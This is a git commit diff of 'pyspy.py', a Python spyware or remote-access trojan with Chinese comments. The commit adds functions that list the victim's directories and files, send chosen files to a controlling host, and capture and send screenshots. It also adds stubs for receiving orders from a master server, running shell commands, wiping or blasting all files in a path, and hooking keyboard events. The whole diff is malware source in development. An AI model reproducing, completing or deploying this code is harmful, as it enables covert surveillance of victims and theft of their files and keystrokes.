4ff2ad0ea3f25bd28c2a9a30406b27f803dbe6fb
flowerflow <3134454017@qq.com>
2018-03-27 00:41:42 +0800

    更新

--- pyspy.py
+++ pyspy.py
@@ -10,9 +10,12 @@ import chardet
 import time
 from PIL import ImageGrab
 IP=''
-#这里需要开启两个端口，
+#这里需要开启3个端口，
 # 一个负责发送信息， threadnewssocket
 # 一个负责发送文件   threadfilesocket
+# 一个接受主机消息   threadgetorder
+
+######发送文件的线程##############
 def sendthread(IP,FILE):
     try:
         if  os.path.exists(FILE):
@@ -25,17 +28,30 @@ def sendthread(IP,FILE):
     except Exception:
         #异常处理
         return
-def sendfiletohost(IP,FILE):
-    thread1 = threading.Thread(target=sendthread, args=(IP, FILE,))
-    thread1.start()
+#############发送信息的线程#######
 def sendtohost(IP,INFO):
     print(INFO)
     pass
+#########获取主服务器的线程######
+def  getorderthread():
+    try :
+        # 1连接主服务器
+        # 一直获取信息
+        pass
+    except Exception:
+        # 重新连接
+        pass
+#发送文件
+def sendfiletohost(IP,FILE):
+    thread1 = threading.Thread(target=sendthread, args=(IP, FILE,))
+    thread1.start()
+#获取当前工作目录
 def getlocaldir():
     try:
         sendtohost(IP,os.getcwd())
     except Exception:
         pass
+#获取当前目录下文件
 def getlocalfiledir():
     c=os.listdir(os.getcwd())
     info=''
@@ -50,23 +66,29 @@ def getlocalfiledir():
             info+='  document'
             info+='\n'
     sendtohost(IP,info)
+#获得上层文件目录
 def getthetopfiledir():
     toppath=(os.path.dirname(os.path.dirname(__file__))).decode('gb2312')
     sendtohost(IP,toppath)
+#获得文件
 def getfile(path,name):
     FILE=path+'\\'+name
     sendfiletohost(IP,FILE)
+#强势爆破path目录下
 def boomwenjian(path):
     #那就是强势的爆破所有文件233
     pass
+#获取截图
 def jietu():
     #
     im = ImageGrab.grab()
     name=os.getcwd()+"\\"+time.strftime("%H+%M+%S")+".jpg"
     im.save(name)
     sendfiletohost(IP,name)
+#执行cmd
 def cmd():
 	pass
+#键盘事件
 def onKeyboardEvent(event):
     return True
 
